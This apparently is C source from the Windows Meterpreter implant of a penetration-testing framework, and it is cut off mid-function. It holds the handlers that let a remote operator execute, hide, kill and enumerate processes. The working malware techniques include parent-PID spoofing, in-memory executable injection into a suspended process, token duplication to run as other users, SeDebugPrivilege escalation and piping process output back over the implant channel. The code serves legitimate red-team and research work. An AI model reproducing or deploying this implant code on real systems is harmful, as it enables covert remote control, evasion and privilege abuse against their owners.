#include "precomp.h"
#include "common_metapi.h"
#include "ps.h" // include the code for listing proceses

#include "./../session.h"
#include "in-mem-exe.h" /* include skapetastic in-mem exe exec */

typedef struct _STARTUPINFOEXW
{
	STARTUPINFOW StartupInfo;
	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXW, *LPSTARTUPINFOEXW;

const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

/*
 * Attaches to the supplied process identifier.  If no process identifier is
 * supplied, the handle for the current process is returned to the requestor.
 *
 * req: TLV_TYPE_PID - The process to attach to.
 */
DWORD request_sys_process_attach(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE handle = NULL;
	DWORD result = ERROR_SUCCESS;
	DWORD pid;

	// Get the process identifier that we're attaching to, if any.
	pid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PID);
	dprintf("[attach]: pid %d", pid);
	// No pid? Use current.
	if (!pid)
		handle = met_api->win_api.kernel32.GetCurrentProcess();
	// Otherwise, attach.
	else
	{
		BOOLEAN inherit = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
		DWORD permission = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);

		handle = met_api->win_api.kernel32.OpenProcess(permission, inherit, pid);
		dprintf("[attach] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", pid, permission, handle, met_api->win_api.kernel32.GetLastError());
	}

	// If we have a handle, add it to the response
	if (handle)
		met_api->packet.add_tlv_qword(response, TLV_TYPE_HANDLE, (QWORD)handle);
	else
		result = met_api->win_api.kernel32.GetLastError();

	// Send the response packet to the requestor
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Closes a handle that was opened via the attach method
 *
 * req: TLV_TYPE_HANDLE - The process handle to close.
 */
DWORD request_sys_process_close(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE handle;
	DWORD result = ERROR_SUCCESS;
	handle = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_HANDLE);


	if (handle)
	{
		if (handle != met_api->win_api.kernel32.GetCurrentProcess())
			met_api->win_api.kernel32.CloseHandle(handle);
	}
	else
		result = ERROR_INVALID_PARAMETER;

	// Send the response packet to the requestor
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

BOOL needs_quoting(PCHAR str)
{
	// Initial value is to need quoting, in case it's an empty arg
	BOOL bNeedsQuoting = TRUE;
	char* pArgIndex = str;
	// Check whether we'll need to quote the argument
	while (*pArgIndex != '\0')
	{
		// The arg is not empty
		bNeedsQuoting = FALSE;
		if (*pArgIndex == '\v' || *pArgIndex == ' ' || *pArgIndex == '\t')
		{
			bNeedsQuoting = TRUE;
			break;
		}
		++pArgIndex;
	}
	
	return bNeedsQuoting;
}

DWORD get_commandline(Packet *packet, DWORD flags, PCHAR* commandLine)
{
	// Check new-style arguments first
	DWORD dwTlvIndex = 0;
	Tlv argTlv;
	char* pArgStart;
	char* pArgIndex;
	BOOL bNeedsQuoting;
	size_t commandLineLength = 0;
	size_t commandLineWriteIndex = 0;
	PCHAR path, arguments = NULL;
	DWORD backslashCount;

	if (flags & PROCESS_EXECUTE_FLAG_ARG_ARRAY)
	{
	    path = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_PROCESS_UNESCAPED_PATH);
		// Calculate the potential size of our command line.
		// The path may need quoting, so two extra chars there, plus null terminator.
		commandLineLength = strlen(path) + 3;

		// Now look at arguments
		while (ERROR_SUCCESS == met_api->packet.enum_tlv(packet, dwTlvIndex++, TLV_TYPE_PROCESS_ARGUMENT, &argTlv))
		{
			commandLineLength += strlen((char*)argTlv.buffer);
			commandLineLength += 3; // Two quotes bookending it, plus a space between the arguments
		}

		// In the worst case, we've got a lot of backslashes just before a quote character, which will need to double in size.
		// So, allocate for the worst-case expansion.
		commandLineLength *= 2;

		if (!(*commandLine = (PCHAR)malloc(commandLineLength)))
		{
			return ERROR_NOT_ENOUGH_MEMORY;
		}
		
		// Append the path to the command line, possibly quoting, but no escaping
		bNeedsQuoting = needs_quoting(path);
		if (bNeedsQuoting)
		{
			(*commandLine)[commandLineWriteIndex++] = '"';
		}

		strncpy_s((*commandLine) + commandLineWriteIndex, commandLineLength - commandLineWriteIndex, path, strlen(path));
		commandLineWriteIndex += strlen(path);
		if (bNeedsQuoting)
		{
			(*commandLine)[commandLineWriteIndex++] = '"';
		}

		dwTlvIndex = 0;
		while (ERROR_SUCCESS == met_api->packet.enum_tlv(packet, dwTlvIndex++, TLV_TYPE_PROCESS_ARGUMENT, &argTlv))
		{
			if (dwTlvIndex != 0)
			{
				// Add a space between arguments
				(*commandLine)[commandLineWriteIndex++] = ' ';
			}
			
			pArgStart = (char*)argTlv.buffer;
			bNeedsQuoting = needs_quoting(pArgStart);

			// Now build up the command line
			pArgIndex = pArgStart;
			backslashCount = 0;
			if (bNeedsQuoting)
			{
				(*commandLine)[commandLineWriteIndex++] = '"';
			}

			while (*pArgIndex != '\0')
			{
				if (*pArgIndex == '\\')
				{
					++backslashCount;
				}
				else
				{
					if (*pArgIndex == '"')
					{
						// We've encountered a double quote - if there are any backslashes immediately preceding, double them
						for (DWORD i = 0; i < backslashCount; ++i)
						{
							(*commandLine)[commandLineWriteIndex++] = '\\';
						}
						// Now actually escape the double-quote
						(*commandLine)[commandLineWriteIndex++] = '\\';
					}

					backslashCount = 0;
				}
				// Now write out whatever the character was
				(*commandLine)[commandLineWriteIndex++] = *pArgIndex;

				++pArgIndex;
			}
			if (bNeedsQuoting)
			{
				// We're about to add another quote - check for backslash doubling again
				for (DWORD i = 0; i < backslashCount; ++i)
				{
					(*commandLine)[commandLineWriteIndex++] = '\\';
				}
				(*commandLine)[commandLineWriteIndex++] = '"';

			}
		}
		(*commandLine)[commandLineWriteIndex++] = '\0';
		dprintf("[PROCESS] Created command line: %s", *commandLine);
	}
	else
	{
	    path = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_PROCESS_PATH);
		arguments = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_PROCESS_ARGUMENTS);
		// If the remote endpoint provided arguments, combine them with the
		// executable to produce a command line
		if (path && arguments)
		{
			commandLineLength = strlen(path) + strlen(arguments) + 2;

			if (!(*commandLine = (PCHAR)malloc(commandLineLength)))
			{
				return ERROR_NOT_ENOUGH_MEMORY;
			}

			_snprintf(*commandLine, commandLineLength, "%s %s", path, arguments);
		}
		else if (path)
		{
			*commandLine = path;
		}
		else
		{
			return ERROR_INVALID_PARAMETER;
		}
		dprintf("[PROCESS] Using legacy command line: %s", *commandLine);
	}
	return ERROR_SUCCESS;
}

/*
 * Executes a process using the supplied parameters, optionally creating a
 * channel through which output is filtered.
 *
 * req: TLV_TYPE_PROCESS_PATH      - The executable to launch
 * req: TLV_TYPE_PROCESS_ARGUMENTS - The arguments to pass
 * req: TLV_TYPE_FLAGS             - The flags to execute with
 */
DWORD request_sys_process_execute(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Tlv inMemoryData;
	BOOL doInMemory = FALSE;
	PROCESS_INFORMATION pi;
	STARTUPINFOEXW si;
	HANDLE in[2], out[2];
	PCHAR commandLine = NULL;
	wchar_t* commandLine_w = NULL;
	DWORD flags = 0, createFlags = 0, ppid = 0;
	BOOL inherit = FALSE;
	HANDLE token, pToken;
	HANDLE parentHandle = NULL;
	char * cpDesktop = NULL;
	DWORD session = 0;
	LPVOID pEnvironment = NULL;
	ProcessChannelContext * ctx = NULL;
	size_t size = 0;

	dprintf( "[PROCESS] request_sys_process_execute" );

	// Initialize the startup information
	memset( &pi, 0, sizeof(PROCESS_INFORMATION) );
	memset( &si, 0, sizeof(STARTUPINFOEXW) );

	si.StartupInfo.cb = sizeof(STARTUPINFOW);
	si.lpAttributeList = NULL;

	// Initialize pipe handles
	in[0]  = NULL;
	in[1]  = NULL;
	out[0] = NULL;
	out[1] = NULL;

	do
	{
		// No response? We suck.
		if (!response)
		{
			break;
		}
		

		flags = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_FLAGS);
		// Get the execution command line
		result = get_commandline(packet, flags, &commandLine);
		if (result != ERROR_SUCCESS)
		{
			break;
		}

		ppid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PARENT_PID);

		if (met_api->packet.get_tlv(packet, TLV_TYPE_VALUE_DATA, &inMemoryData) == ERROR_SUCCESS)
		{
			doInMemory = TRUE;
			createFlags |= CREATE_SUSPENDED;
		}

		if (flags & PROCESS_EXECUTE_FLAG_DESKTOP)
		{
			do
			{
				cpDesktop = (char *)calloc(512, sizeof(char));
				if (!cpDesktop)
				{
					break;
				}

				met_api->lock.acquire(remote->lock);

				_snprintf(cpDesktop, 512, "%s\\%s", remote->curr_station_name, remote->curr_desktop_name);

				met_api->lock.release(remote->lock);

				size = mbstowcs(NULL, cpDesktop, 0);
				if (size == (size_t)-1)
				{
					break;
				}

				si.StartupInfo.lpDesktop = calloc(size + 1, sizeof(wchar_t));
				mbstowcs(si.StartupInfo.lpDesktop, cpDesktop, size);

			} while (0);
		}

		// If the channelized flag is set, create a pipe for stdin/stdout/stderr
		// such that input can be directed to and from the remote endpoint
		if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED)
		{
			SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
			PoolChannelOps chops;
			Channel *newChannel;

			// Allocate the channel context
			if (!(ctx = (ProcessChannelContext *)malloc(sizeof(ProcessChannelContext))))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			memset(&chops, 0, sizeof(PoolChannelOps));

			// Initialize the channel operations
			dprintf("[PROCESS] context address 0x%p", ctx);
			chops.native.context = ctx;
			chops.native.write = process_channel_write;
			chops.native.close = process_channel_close;
			chops.native.interact = process_channel_interact;
			chops.read = process_channel_read;

			// Allocate the pool channel
			if (!(newChannel = met_api->channel.create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops)))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			// Set the channel's type to process
			met_api->channel.set_type(newChannel, "process");

			// Allocate the stdin and stdout pipes
			if ((!met_api->win_api.kernel32.CreatePipe(&in[0], &in[1], &sa, 0)) || (!met_api->win_api.kernel32.CreatePipe(&out[0], &out[1], &sa, 0)))
			{
				met_api->channel.destroy(newChannel, NULL);

				newChannel = NULL;

				free(ctx);

				result = met_api->win_api.kernel32.GetLastError();
				break;
			}

			// Initialize the startup info to use the pipe handles
			si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
			si.StartupInfo.hStdInput = in[0];
			si.StartupInfo.hStdOutput = out[1];
			si.StartupInfo.hStdError = out[1];
			inherit = TRUE;
			createFlags |= CREATE_NEW_CONSOLE;

			// Set the context to have the write side of stdin and the read side
			// of stdout
			ctx->pStdin = in[1];
			ctx->pStdout = out[0];

			// Add the channel identifier to the response packet
			met_api->packet.add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, met_api->channel.get_id(newChannel));
		}

		// If the hidden flag is set, create the process hidden
		if (flags & PROCESS_EXECUTE_FLAG_HIDDEN)
		{
			si.StartupInfo.dwFlags |= STARTF_USESHOWWINDOW;
			si.StartupInfo.wShowWindow = SW_HIDE;
			createFlags |= CREATE_NO_WINDOW;
		}

		// Should we create the process suspended?
		if (flags & PROCESS_EXECUTE_FLAG_SUSPENDED)
			createFlags |= CREATE_SUSPENDED;

		// Set Parent PID if provided
		if (ppid) {
			dprintf("[execute] PPID spoofing\n");
			BOOLEAN inherit = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
			DWORD permission = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);
			parentHandle = met_api->win_api.kernel32.OpenProcess(permission, inherit, ppid);
			SIZE_T len = 0;
			if (!parentHandle) {
				result = met_api->win_api.kernel32.GetLastError();
				break;
			}

			// Missing optional exports preserve LastError, so seed a deterministic
			// result before using the wrapper as an availability probe.
			met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
			met_api->win_api.kernel32.InitializeProcThreadAttributeList(NULL, 1, 0, &len);
			DWORD attributeError = met_api->win_api.kernel32.GetLastError();
			dprintf("[execute] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", ppid, permission, parentHandle, attributeError);
			if (len != 0) {
				si.lpAttributeList = malloc(len);
				if (!si.lpAttributeList) {
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
				if (!met_api->win_api.kernel32.InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &len)) {
					result = met_api->win_api.kernel32.GetLastError();
					dprintf("[execute] InitializeProcThreadAttributeList: [%d]\n", result);
					break;
				}

				dprintf("[execute] InitializeProcThreadAttributeList\n");

				met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
				if (!met_api->win_api.kernel32.UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), 0, 0)) {
					result = met_api->win_api.kernel32.GetLastError();
					dprintf("[execute] UpdateProcThreadAttribute: [%d]\n", result);
					break;
				}

				dprintf("[execute] UpdateProcThreadAttribute\n");

				createFlags |= EXTENDED_STARTUPINFO_PRESENT;
				si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
			}
			else {
				result = attributeError;
				break;
			}
		}

		// Try to execute the process with duplicated token
		if (!(commandLine_w = met_api->string.utf8_to_wchar(commandLine)))
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		if (flags & PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN)
		{
			// If there is an impersonated token stored, use that one first, otherwise
			// try to grab the current thread token, then the process token
			if (remote->thread_token)
			{
				token = remote->thread_token;
				dprintf("[execute] using thread impersonation token");
			}
			else if (!met_api->win_api.advapi32.OpenThreadToken(met_api->win_api.kernel32.GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &token))
			{
				met_api->win_api.advapi32.OpenProcessToken(met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_ALL_ACCESS, &token);
			}

			dprintf("[execute] token is 0x%.8x", token);

			// Duplicate to make primary token (try delegation first)
			if (!met_api->win_api.advapi32.DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken))
			{
				if (!met_api->win_api.advapi32.DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken))
				{
					result = met_api->win_api.kernel32.GetLastError();
					dprintf("[execute] failed to duplicate token 0x%.8x", result);
					break;
				}
			}

			if (met_api->win_api.userenv.CreateEnvironmentBlock(&pEnvironment, pToken, FALSE))
			{
				createFlags |= CREATE_UNICODE_ENVIRONMENT;
				dprintf("[execute] created a duplicated environment block");
			}
			else
			{
				pEnvironment = NULL;
			}

			if (!met_api->win_api.advapi32.CreateProcessAsUserW(pToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, pEnvironment, NULL, &si.StartupInfo, &pi))
			{
				wchar_t * wcmdline = NULL;
				wchar_t * wdesktop = NULL;
				result = met_api->win_api.kernel32.GetLastError();

				// sf: If we hit an ERROR_PRIVILEGE_NOT_HELD failure we can fall back to CreateProcessWithTokenW but this is only
				// available on 2003/Vista/2008/7. CreateProcessAsUser() seems to be just borked on some systems IMHO.
				if (result == ERROR_PRIVILEGE_NOT_HELD)
				{
					do
					{
						// convert the multibyte inputs to wide strings (No CreateProcessWithTokenA available unfortunatly)...
						size = mbstowcs(NULL, commandLine, 0);
						if (size == (size_t)-1)
						{
							break;
						}

						wcmdline = (wchar_t *)malloc((size + 1) * sizeof(wchar_t));
						mbstowcs(wcmdline, commandLine, size);

						if (si.StartupInfo.lpDesktop)
						{
							size = mbstowcs(NULL, (char *)si.StartupInfo.lpDesktop, 0);
							if (size != (size_t)-1)
							{
								wdesktop = (wchar_t *)malloc((size + 1) * sizeof(wchar_t));
								mbstowcs(wdesktop, (char *)si.StartupInfo.lpDesktop, size);
								si.StartupInfo.lpDesktop = wdesktop;
							}
						}

						if (!met_api->win_api.advapi32.CreateProcessWithTokenW(pToken, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, createFlags, pEnvironment, NULL, &si.StartupInfo, &pi))
						{
							result = met_api->win_api.kernel32.GetLastError();
							dprintf("[execute] failed to create the new process via CreateProcessWithTokenW 0x%.8x", result);
							break;
						}

						result = ERROR_SUCCESS;
					} while (0);

					SAFE_FREE(wdesktop);
					SAFE_FREE(wcmdline);
				}
				else
				{
					dprintf("[execute] failed to create the new process via CreateProcessAsUser 0x%.8x", result);
					break;
				}
			}

			if (pEnvironment)
			{
				met_api->win_api.userenv.DestroyEnvironmentBlock(pEnvironment);
			}
		}
		else if (flags & PROCESS_EXECUTE_FLAG_SESSION)
		{
			HANDLE hToken = NULL;
			DWORD dwResult = ERROR_SUCCESS;

			do
			{
				session = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_SESSION);

				if (session_id(met_api->win_api.kernel32.GetCurrentProcessId()) == session)
				{
					if (!met_api->win_api.kernel32.CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
					{
						dwResult = met_api->win_api.kernel32.GetLastError();
						dprintf("[PROCESS] execute in self session: CreateProcessW failed. error=%d (0x%x)", dwResult, (ULONG_PTR)dwResult);
						break;
					}
				}
				else
				{
					met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
					if (!met_api->win_api.wtsapi32.WTSQueryUserToken(session, &hToken))
					{
						dwResult = met_api->win_api.kernel32.GetLastError();
						if (dwResult != ERROR_PROC_NOT_FOUND)
						{
							dprintf("[PROCESS] execute in session: WTSQueryUserToken failed. error=%d (0x%x)", dwResult, (ULONG_PTR)dwResult);
							break;
						}

						// NT4/2000 do not export WTSQueryUserToken. Their historical
						// behavior is to create the process in the current session.
						if (!met_api->win_api.kernel32.CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
						{
							dwResult = met_api->win_api.kernel32.GetLastError();
							break;
						}
						dwResult = ERROR_SUCCESS;
					}
					else if (!met_api->win_api.advapi32.CreateProcessAsUserW(hToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
					{
						dwResult = met_api->win_api.kernel32.GetLastError();
						dprintf("[PROCESS] execute in session: CreateProcessAsUser failed. error=%d (0x%x)", dwResult, (ULONG_PTR)dwResult);
						break;
					}
				}

			} while (0);

			if (hToken)
			{
				met_api->win_api.kernel32.CloseHandle(hToken);
			}

			result = dwResult;

			if (result != ERROR_SUCCESS)
			{
				break;
			}
		}
		else
		{
			// Try to execute the process
			if (!met_api->win_api.kernel32.CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
			{
				result = met_api->win_api.kernel32.GetLastError();
				break;
			}
		}

		//
		// Do up the in memory exe execution if the user requested it
		//
		if (doInMemory)
		{

			//
			// Unmap the dummy executable and map in the new executable into the
			// target process
			//
			if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, inMemoryData.buffer))
			{
				result = met_api->win_api.kernel32.GetLastError();
				break;
			}

			//
			// Resume the thread and let it rock...
			//
			if (met_api->win_api.kernel32.ResumeThread(pi.hThread) == (DWORD)-1)
			{
				result = met_api->win_api.kernel32.GetLastError();
				break;
			}

		}

		// check for failure here otherwise we can get a case where we
		// failed but return a process id and this will throw off the ruby side.
		if (result == ERROR_SUCCESS)
		{
			// if we managed to successfully create a channelized process, we need to retain
			// a handle to it so that we can shut it down externally if required.
			if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED
				&& ctx != NULL)
			{
				dprintf("[PROCESS] started process 0x%x", pi.hProcess);
				ctx->pProcess = pi.hProcess;
			}

			// Add the process identifier to the response packet
			met_api->packet.add_tlv_uint(response, TLV_TYPE_PID, pi.dwProcessId);

			met_api->packet.add_tlv_qword(response, TLV_TYPE_PROCESS_HANDLE, (QWORD)pi.hProcess);

			met_api->win_api.kernel32.CloseHandle(pi.hThread);
		}

	} while (0);

	// Close the read side of stdin and the write side of stdout
	if (in[0])
	{
		met_api->win_api.kernel32.CloseHandle(in[0]);
	}
	if (out[1])
	{
		met_api->win_api.kernel32.CloseHandle(out[1]);
	}
	if (parentHandle)
	{
		met_api->win_api.kernel32.CloseHandle(parentHandle);
	}

	// Free the command line if necessary
	if (commandLine)
	{
		free(commandLine);
	}

	if (cpDesktop)
	{
		free(cpDesktop);
	}

	if (commandLine_w)
	{
		free(commandLine_w);
	}

	if (si.StartupInfo.lpDesktop)
	{
		free(si.StartupInfo.lpDesktop);
	}

	if (si.lpAttributeList)
	{
		free(si.lpAttributeList);
	}

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Kills one or more supplied processes
 *
 * req: TLV_TYPE_PID [n]
 */
DWORD request_sys_process_kill(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Tlv pidTlv;
	DWORD index = 0;

	while ((met_api->packet.enum_tlv(packet, index++, TLV_TYPE_PID,
			&pidTlv) == ERROR_SUCCESS) &&
			(pidTlv.header.length >= sizeof(DWORD)))
	{
		DWORD pid = met_api->win_api.ws2_32.ntohl(*(LPDWORD)pidTlv.buffer);
		HANDLE h = NULL;

		// Try to attach to the process
		if (!(h = met_api->win_api.kernel32.OpenProcess(PROCESS_TERMINATE, FALSE, pid)))
		{
			result = met_api->win_api.kernel32.GetLastError();
			break;
		}

		if (!met_api->win_api.kernel32.TerminateProcess(h, 0))
			result = met_api->win_api.kernel32.GetLastError();

		met_api->win_api.kernel32.CloseHandle(h);
	}

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Gets the list of active processes (including their PID, name, user, arch and path)
 * and sends the information back to the requestor. See ps.c for the guts of this.
 */
DWORD request_sys_process_get_processes( Remote * remote, Packet * packet )
{

	Packet * response = NULL;
	HANDLE hToken     = NULL;
	DWORD result      = ERROR_SUCCESS;

	do
	{
		response = met_api->packet.create_response( packet );
		if( !response )
			break;

		// If we can, get SeDebugPrivilege...
		if( met_api->win_api.advapi32.OpenProcessToken( met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )
		{
			TOKEN_PRIVILEGES priv = {0};

			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if( met_api->win_api.advapi32.LookupPrivilegeValueA( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				met_api->win_api.advapi32.AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			met_api->win_api.kernel32.CloseHandle( hToken );
		}

		// First we will try to get a process list via the toolhelp API. This method gives us the most information
		// on all processes, including processes we cant actually open and all x64/x86 processes on x64 systems.
		// However NT4 does not have the toolhelp API (but Win98 did!?!).
		result = ps_list_via_toolhelp( response );
		if( result != ERROR_SUCCESS )
		{
			// Second attempt is to use the PSAPI functions which may work on NT4 if the PSAPI patch has been applied.
			result = ps_list_via_psapi( response );
			if( result != ERROR_SUCCESS )
			{
				// Third method is to brute force the process list (and extract info from PEB) if all other methods have failed.
				result = ps_list_via_brute( response );
			}
		}

		met_api->packet.transmit_response( result, remote, response );

	} while( 0 );

	return result;
}

/*
 * Handles the getpid request
 */
DWORD request_sys_process_getpid(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	met_api->packet.add_tlv_uint(response, TLV_TYPE_PID, met_api->win_api.kernel32.GetCurrentProcessId());

	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Returns information about the supplied process handle.
 *
 * req: TLV_TYPE_HANDLE - The handle to gather information from.
 */
DWORD request_sys_process_get_info(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	HMODULE mod;
	HANDLE handle;
	DWORD result = ERROR_SUCCESS;
	DWORD needed;
	wchar_t path[1024], name[512];

	handle = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_HANDLE);

	do
	{
		// Valid response?
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Valid parameters?
		if (!handle)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		memset(name, 0, sizeof(name));
		memset(path, 0, sizeof(path));

		// Enumerate the first module in the process and get its base name
		if ((!met_api->win_api.psapi.EnumProcessModules(handle, &mod, sizeof(mod), &needed) ||
			 (met_api->win_api.psapi.GetModuleBaseNameW(handle, mod, name, sizeof(name) - 1) == 0)))
		{
			result = met_api->win_api.kernel32.GetLastError();
			break;
		}

		// Try to get the process' file name
		met_api->win_api.psapi.GetModuleFileNameExW(handle, mod, path, sizeof(path) - 1);

		// Set the process' information on the response
		met_api->packet.add_tlv_string(response, TLV_TYPE_PROCESS_NAME, met_api->string.wchar_to_utf8(name));
		met_api->packet.add_tlv_string(response, TLV_TYPE_PROCESS_PATH, met_api->string.wchar_to_utf8(path));

	} while (0);

	// Transmit the response
	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

/************************
 * Process DIO handlers *
 ************************/

/*
 * Reads directly from the output handle of the process
 *
 * FIXME: can-block
 */
DWORD process_channel_read(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;

	dprintf("[PROCESS] process_channel_read. channel=0x%08X, ctx=0x%08X", channel, ctx);

	if (ctx == NULL)
		return ERROR_SUCCESS;

	if (!met_api->win_api.kernel32.ReadFile(ctx->pStdout, buffer, bufferSize, bytesRead, NULL))
		return met_api->win_api.kernel32.GetLastError();

	return ERROR_SUCCESS;
}

/*
 * Writes data from the remote half of the channel to the process's standard
 * input handle
 */
DWORD process_channel_write(Channel* channel, Packet* request, LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
{
	ProcessChannelContext* ctx = (ProcessChannelContext*)context;
	DWORD result = ERROR_SUCCESS;

	dprintf("[PROCESS] process_channel_write. channel=0x%08X, ctx=0x%08X", channel, ctx);

	if (ctx == NULL)
	{
		return result;
	}

	if (!met_api->win_api.kernel32.WriteFile(ctx->pStdin, buffer, bufferSize, bytesWritten, NULL))
	{
		result = met_api->win_api.kernel32.GetLastError();
	}

	return result;
}

/*
 * Closes the channels that were opened to the process.
 */
DWORD process_channel_close( Channel *channel, Packet *request, LPVOID context )
{
	DWORD result = ERROR_SUCCESS;
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;

	dprintf( "[PROCESS] process_channel_close. channel=0x%08X, ctx=0x%08X", channel, ctx );

	if (ctx == NULL)
	{
		return result;
	}
	if ( ctx->pProcess != NULL ) {
		dprintf( "[PROCESS] channel has an attached process, closing via scheduler signal. channel=0x%08X, ctx=0x%08X", channel, ctx );
		met_api->scheduler.signal_waitable( ctx->pStdout, SchedulerStop );
	} else {
		met_api->win_api.kernel32.CloseHandle( ctx->pStdin );
		met_api->win_api.kernel32.CloseHandle( ctx->pStdout );

		free( ctx );
	}
	return result;
}

DWORD process_channel_interact_destroy( HANDLE waitable, LPVOID entryContext, LPVOID threadContext )
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)threadContext;
	DWORD dwResult = ERROR_SUCCESS;
	Channel *channel = (Channel *)entryContext;

	dprintf( "[PROCESS] terminating context 0x%p", ctx );

	if (ctx == NULL)
	{
		return dwResult;
	}

	met_api->win_api.kernel32.CloseHandle( ctx->pStdin );
	met_api->win_api.kernel32.CloseHandle( ctx->pStdout );

	if( ctx->pProcess ) {
		dprintf( "[PROCESS] terminating process 0x%x", ctx->pProcess );
		met_api->win_api.kernel32.TerminateProcess( ctx->pProcess, 0 );
	}

	free( ctx );
	if (met_api->channel.exists(channel))
	{
		channel->ops.pool.native.context = NULL;
	}

	return dwResult;
}

/*
 * Callback for when data is available on the standard output handle of
 * a process channel that is interactive mode
 */
DWORD process_channel_interact_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext)
{
	dprintf("[PROCESS] process_channel_interact_notify: START");
	Channel* channel = (Channel*)entryContext;
	ProcessChannelContext* ctx = (ProcessChannelContext*)threadContext;
	DWORD bytesRead, bytesAvail = 0;
	CHAR buffer[16384];
	DWORD result = ERROR_SUCCESS;

	if (!met_api->channel.exists(channel) || ctx == NULL)
	{
		dprintf("[PROCESS] process_channel_interact_notify: channel not here, or context is NULL");
		return result;
	}

	dprintf("[PROCESS] process_channel_interact_notify: looking for stuff on the stdout pipe");
	if (met_api->win_api.kernel32.PeekNamedPipe(ctx->pStdout, NULL, 0, NULL, &bytesAvail, NULL))
	{
		dprintf("[PROCESS] process_channel_interact_notify: named pipe call returned, %u bytes", bytesAvail);
		if (bytesAvail)
		{
			dprintf("[PROCESS] process_channel_interact_notify: attempting to read %u bytes", bytesAvail);
			if (met_api->win_api.kernel32.ReadFile(ctx->pStdout, buffer, sizeof(buffer) - 1, &bytesRead, NULL))
			{
				dprintf("[PROCESS] process_channel_interact_notify: read %u bytes, passing to channel write", bytesRead);
				return met_api->channel.write(channel, remote, NULL, 0, buffer, bytesRead, NULL);
			}
			result = met_api->win_api.kernel32.GetLastError();
		}
		else
		{
